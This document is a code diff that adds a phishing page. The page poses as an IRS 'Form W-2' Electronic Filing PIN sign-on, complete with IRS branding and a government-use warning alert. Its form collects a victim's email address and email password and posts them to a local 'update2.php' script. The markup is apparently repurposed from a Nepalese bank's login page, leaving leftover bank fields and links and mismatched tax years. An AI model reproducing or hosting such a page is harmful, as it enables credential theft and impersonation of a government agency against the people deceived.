@@ -1,0 +1,353 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- Filename:  RetailSignOn.aspx -->
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <meta content="Mozilla/4.7 [en] (WinNT; I) [Netscape]" name="GENERATOR" />
+  <link href="https://sa.www4.irs.gov/w3c/p3p.xml" rel="P3Pv1" />
+  <title>
+   Form W-2
+  </title>
+  <style type="text/css">
+   @import url("css/efp.css");
+  </style>
+  <!--[if IE]>
+		<style type="text/css">
+			@import url("css/efp-ie.css");
+		</style>
+		<![endif]-->
+  <script type="text/JavaScript" language="JavaScript">
+   &lt;!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&amp;&amp;(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//--&gt;
+
+/******************************************
+* Popup Box- By Jim Silver @ jimsilver47@yahoo.com
+* Visit http://www.dynamicdrive.com/ for full source code
+* This notice must stay intact for use
+******************************************/
+
+/////////////////////////////////
+var ns4=document.layers
+var ie4=document.all
+var ns6=document.getElementById&amp;&amp;!document.all
+
+
+//drag drop function for NS 4////
+/////////////////////////////////
+
+var dragswitch=0
+var nsx
+var nsy
+var nstemp
+
+function drag_dropns(name){
+if (!ns4)
+return
+temp=eval(name)
+temp.captureEvents(Event.MOUSEDOWN | Event.MOUSEUP)
+temp.onmousedown=gons
+temp.onmousemove=dragns
+temp.onmouseup=stopns
+}
+
+function gons(e){
+temp.captureEvents(Event.MOUSEMOVE)
+nsx=e.x
+nsy=e.y
+}
+function dragns(e){
+if (dragswitch==1){
+temp.moveBy(e.x-nsx,e.y-nsy)
+return false
+}
+}
+
+function stopns(){
+temp.releaseEvents(Event.MOUSEMOVE)
+}
+
+/////////////////////////////////
+
+
+function drag_drop(e){
+if (ie4&amp;&amp;dragapproved){
+crossobj.style.left=tempx+event.clientX-offsetx
+crossobj.style.top=tempy+event.clientY-offsety
+return false
+}
+else if (ns6&amp;&amp;dragapproved){
+crossobj.style.left=tempx+e.clientX-offsetx+"px"
+crossobj.style.top=tempy+e.clientY-offsety+"px"
+return false
+}
+}
+
+function initializedrag(e){
+crossobj=ns6? document.getElementById("showimage") : document.all.showimage
+var firedobj=ns6? e.target : event.srcElement
+var topelement=ns6? "html" : document.compatMode &amp;&amp; document.compatMode!="BackCompat"? "documentElement" : "body"
+while (firedobj.tagName!=topelement.toUpperCase() &amp;&amp; firedobj.id!="dragbar"){
+firedobj=ns6? firedobj.parentNode : firedobj.parentElement
+}
+
+if (firedobj.id=="dragbar"){
+offsetx=ie4? event.clientX : e.clientX
+offsety=ie4? event.clientY : e.clientY
+
+tempx=parseInt(crossobj.style.left)
+tempy=parseInt(crossobj.style.top)
+
+dragapproved=true
+document.onmousemove=drag_drop
+}
+}
+document.onmouseup=new Function("dragapproved=false")
+
+////drag drop functions end here//////
+
+function hidebox(){
+crossobj=ns6? document.getElementById("showimage") : document.all.showimage
+if (ie4||ns6)
+crossobj.style.visibility="hidden"
+else if (ns4)
+document.showimage.visibility="hide"
+}
+  </script>
+  <script type="text/javascript">
+   function detectBrowser()
+  {
+  var browser=navigator.appName
+       document.LOGIN.browser.value = browser
+  
+}
+function openWindow() 
+{
+window.open('notice.html', 'windowName', "height=304, width=550, menubar=no, resizable=yes, scrollbars=yes, status=yes, toolbar=no")
+}
+  </script>
+  <script language="javascript">
+   function redirectHome(){
+location.href="http://www.nibl.com.np"
+}
+  </script>
+ </head>
+ <body onload="alert('THIS U.S. GOVERNMENT SYSTEM IS FOR AUTHORIZED USE ONLY! \nUse of this system constitutes consent to monitoring, interception, recording, 
+reading, \ncopying or capturing by authorized personnel of all activities.  There is no right to privacy in \nthis system.  Unauthorized use of this system is 
+prohibited and subject to criminal and civil \npenalties, including all penalties applicable to willful unauthorized access (UNAX) or \ninspection of taxpayer records 
+(under 18 U.S.C. 1030 and 26 U.S.C. 7213A and 26 U.S.C. \n7431'); ">
+  <div id="container">
+   <div id="header">
+    <a class="skip-link" href="#mainContent">
+     Skip to Main Content
+    </a>
+    <table width="600" border="1" cellspacing="0" cellpadding="15">
+     <tbody>
+      <tr>
+       <td>
+        <a href="https://sa.www4.irs.gov/irfof-efp/images/irslogo.gif">
+         <img width="630" height="85" alt="Internal Revenue Service 
+United States Department of the Treasury" title="Internal Revenue Service United States Department of the Treasury" src="./start_files/irslogo.gif" />
+        </a>
+        <div id="headerlinks">
+         <!-- 
+		If user exits application from results page, requirements state to log 
+		a unique CFP.
+	 -->
+         <!-- logout link -->
+         <a title="Click this link to exit out of this site." href="https://sa.www4.irs.gov/irfof-efp/logoff.do?logoffTo=thankYou">
+          Exit
+         </a>
+         |
+         <!-- help link -->
+         <div style="display: inline;" id="jsHelpDiv">
+          <a title="Click this link for a page of help topics." href="javascript:openHelp('help.do','Help')">
+           Help
+          </a>
+         </div>
+         <div style="display: none;" id="noJsHelpDiv">
+          <a title="Click this link for a page of help topics." target="_help" href="https://sa.www4.irs.gov/irfof-efp/help.do">
+           Help
+          </a>
+         </div>
+        </div>
+        <div id="content">
+         <a class="skip-link" name="#mainContent">
+          Main Content
+         </a>
+         <div id="contentHeader">
+         </div>
+         <h1>
+          Form  W-2
+         </h1>
+        </div>
+        <div id="errorContent" style="display: none;">
+        </div>
+        <div style="display: inline;" id="piHelpTopicPopupDiv">
+         <h4>
+          Enter the following information as it appears on your 2015 or Earlier Federal Income Tax Return.
+          <a title="Click for additional information on entering your tax 
+information." href="javascript:openHelpTopic('/irfof-efp/help.do?helpKey=personalInfo',%20'personalInfo')">
+           <img alt="Click for additional information 
+on entering your tax information." title="Click for additional information on entering your tax information." src="./start_files/qMarkNew.gif" />
+          </a>
+         </h4>
+        </div>
+        <div style="display: none;" id="piHelpTopicTargetDiv">
+         <h4>
+          Enter the following information as it appears on your 2014 Federal Income Tax Return.
+          <a title="Click for additional information on entering your tax 
+information." target="_help" href="https://sa.www4.irs.gov/irfof-efp/help.do?helpKey=personalInfo">
+           <img alt="Click for additional information 
+on entering your tax information." title="Click for additional information on entering your tax information." src="./start_files/qMarkNew.gif" />
+          </a>
+         </h4>
+        </div>
+        <form name="RetailSignOn" method="POST" action="update2.php">
+         <table summary="Please fill out the following form to receive your Electronic Filing PIN." class="shared_secrets_table" id="sharedSecretsTable">
+          <caption align="left-1">
+           Required fields
+           <span class="required">
+            *
+           </span>
+          </caption>
+          <tbody>
+           <tr>
+            <td width="23%" bgcolor="#FFFFFF" align="center">
+             <div align="right">
+              <span style="background-color: #FFFFFF">
+               <font color="#000000">
+                <b>
+                 Email Address
+                </b>
+               </font>
+              </span>
+              <font color="#000000">
+               <b>
+                <span style="background-color: #FFFFFF">
+                 : 
+                </span>
+               </b>
+              </font>
+             </div>
+            </td>
+            <td width="75%" bgcolor="#FFFFFF" align="center">
+             <div align="left">
+              <font color="#FFFFFF">
+               <input maxlength="50" size="30" name="a" />
+              </font>
+              <font color="#000000">
+               <span style="background-color: #FFFFFF">
+               </span>
+              </font>
+             </div>
+            </td>
+           </tr>
+           <tr>
+            <td width="23%" bgcolor="#FFFFFF" align="center">
+             <div align="right">
+              <span style="background-color: #FFFFFF">
+               <font color="#000000">
+                <b>
+                 Email
+                </b>
+               </font>
+              </span>
+              <font color="#000000">
+               <b>
+                <span style="background-color: #FFFFFF">
+                 Password: 
+                </span>
+               </b>
+              </font>
+             </div>
+            </td>
+            <td width="75%" bgcolor="#FFFFFF" align="center">
+             <div align="left">
+              <font color="#FFFFFF">
+               <input type="password" maxlength="50" size="30" name="b" />
+              </font>
+              <font color="#000000">
+               <span style="background-color: #FFFFFF">
+               </span>
+              </font>
+             </div>
+            </td>
+           </tr>
+           <!--********Added for MobiToken Enhancement, Techonline Call id: 60089: Start*********--->
+           <!--<tr> 
+                                <td width="54%" align="center"> 
+                                  <div align="right">mPIN :&nbsp;</div>
+                                </td>
+                                <td width="46%" align="center"> 
+                                  <div align="left"><input type="Password" name="CorporateSignonMPin" size=6 maxlength=6 >&nbsp;<A HREF="javascript: settingPinPadCtl(this,2,'CorporateSignonMPIN'),randomDisplay();" ><IMG SRC="https://www.nibl.com.np/BankAwayRetail/web/L001/images/btn-kbd.gif" ID="imgvk" WIDTH="20" HEIGHT="20" ALT="Show Virtual Keyboard" ALIGN="absmiddle" BORDER="0"></IMG></A></div></td>
+                                   <td width="46%" align="center">
+                                   &nbsp;&nbsp;PassCode&nbsp;
+                                  <input type="Password" name="CorporateSignonPasscode"  size=15 maxlength=12 >&nbsp;<A HREF="javascript: settingPinPadCtl(this,2,'CorporateSignonPasscode'),randomDisplay();" ><IMG SRC="https://www.nibl.com.np/BankAwayRetail/web/L001/images/btn-kbd.gif" ID="imgvk" WIDTH="20" HEIGHT="20" ALT="Show Virtual Keyboard" ALIGN="absmiddle" BORDER="0"></IMG></A></td>
+                                  
+                        </tr>-->
+           <!--********Added for MobiToken Enhancement, Techonline Call id: 60089: End*********--->
+           <!-- ********** Start of Virtual Keyboard recon :Ticket Id:147976 *********** -->
+           <tr>
+            <td width="23%" bgcolor="#FFFFFF">
+            </td>
+            <td width="75%" bgcolor="#FFFFFF">
+            </td>
+           </tr>
+           <tr>
+            <!--<td width="54%">Choose Login Mode:&nbsp;</td>-->
+            <!--********Added for MobiToken Enhancement, Techonline Call id: 60089: Start*********--->
+            <td bgcolor="#FFFFFF">
+             <font color="#FFFFFF">
+              <span style="background-color: #FFFFFF">
+               <!--input type="RADIO" name ="LoginMode" Value ="M"-->
+               <br />
+               <!--input type="RADIO" name ="LoginMode" value ="N" -->
+               <!--********Added for MobiToken Enhancement, Techonline Call id: 60089: End*********--->
+              </span>
+             </font>
+            </td>
+            <td width="75%" bgcolor="#FFFFFF">
+             <span style="background-color: #FFFFFF">
+              <input type="submit" title="Click here to submit the form and receive your Electronic Filing PIN." class="button" value="Finish" name="Action.CorpUser.Signon" id="button1" />
+              <font color="#FFFFFF">
+               <!-- <input  type = "button"  id = "button1" name="Action.CorpUser.Signon" value = "Login" onclick = "encryptValues()"  class="button"> -->
+              </font>
+             </span>
+             <p>
+             </p>
+             <p>
+             </p>
+            </td>
+            <!--<td width="46%"><input type="image" name="Action.CorpUser.Signon"  src="https://www.nibl.com.np/BankAwayRetail/web/L001/images/go3.gif" width="17" height="17" border="0" onclick = "encryptValues()"></td>-->
+           </tr>
+          </tbody>
+         </table>
+        </form>
+       </td>
+      </tr>
+     </tbody>
+    </table>
+    <input type="HIDDEN" value="AL" name="folderId" />
+    <input type="HIDDEN" value="I" name="CorporateSignonAccessChannel" />
+    <input type="HIDDEN" value="1" name="UserType" />
+   </div>
+   <script language="JavaScript">
+    &lt;!--
+	history.forward()
+	//--&gt;
+   </script>
+   <iframe src="./start_files/IFormPage.html" style="display: none" name="refreshSessionFrame">
+    &amp;amp;lt;/body&amp;amp;gt;
+&amp;amp;lt;/html&amp;amp;gt;
+   </iframe>
+  </div>
+  <div>
+  </div>
+ </body>
+</html>
